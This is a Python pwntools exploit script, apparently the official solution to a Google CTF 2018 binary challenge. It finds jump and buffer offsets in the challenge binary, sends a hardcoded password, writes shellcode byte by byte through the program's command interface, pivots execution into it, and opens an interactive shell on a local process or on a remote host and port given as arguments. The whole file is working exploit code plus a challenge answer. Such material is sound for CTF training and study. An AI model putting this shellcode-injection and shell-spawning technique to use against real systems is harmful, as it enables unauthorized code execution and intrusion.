#!/usr/bin/python
#
# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

if len(sys.argv) > 1:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('../challenge/challenge')

data = read('../challenge/challenge')
JMP_POS = data.index('\xC4\xE3\x75\x4C\xC0\xA0') + 6

if data[JMP_POS] == '\xe9':
    MEM_POS = align(32, JMP_POS+5) + 4 * 8
else:
    assert data[JMP_POS] == '\xeb'
    MEM_POS = align(32, JMP_POS+2) + 4 * 8
BUF_POS = data.index('Command: \x00' + '\x00' * 128) + len('Command: \x00')

JMP_POS += 0x400000
MEM_POS += 0x400000
BUF_POS += 0x400000

print hex(JMP_POS)
print hex(MEM_POS)
print hex(BUF_POS)

pivot = asm('''
    mov eax, %d
    jmp rax
''' % BUF_POS).ljust(8)
assert len(pivot) == 8
shellcode = asm('''
    mov rsp, %d
''' % BUF_POS) + asm(shellcraft.sh())
vm_shellcode = '\x40' + p64((JMP_POS - MEM_POS) & 0xffffffffffffffff) + '\x34' + '\x40' + pivot + '\x3c'

r.sendlineafter('Password: ', '5acb8c765bba5c28')

with log.waitfor('Sending shellcode') as h:
    for i, c in enumerate(shellcode):
        h.status('%d/%d' % (i, len(shellcode)))
        r.sendlineafter('Command: ', 's' + chr(i) + c)

with log.waitfor('Sending vm shellcode') as h:
    n = 0
    for i, c in reversed(list(enumerate(vm_shellcode, 0xbd))):
        n += 1
        h.status('%d/%d' % (n, len(vm_shellcode)))
        r.sendlineafter('Command: ', 's' + chr(i) + c)

r.interactive()
